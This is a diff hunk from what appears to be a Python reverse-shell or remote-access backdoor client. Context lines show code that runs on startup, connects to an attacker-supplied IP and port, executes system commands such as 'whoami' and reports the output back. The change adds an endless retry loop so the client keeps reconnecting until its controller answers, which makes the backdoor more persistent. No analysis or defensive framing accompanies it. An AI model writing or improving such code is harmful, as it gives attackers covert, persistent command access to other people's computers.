@@ -44,8 +44,14 @@ def execute_on_startup():
 * Example Call:   connection = establish_connection("192.168.1.11", 2000)
 """
 def establish_connection(ip, port):
-    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    connection.connect((ip, port))
+    while True:
+        try:
+            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            connection.connect((ip, port))
+            break
+
+        except:
+            continue
 
     user = execute_system_command("whoami")
     success_message = "User: {}".format(user)
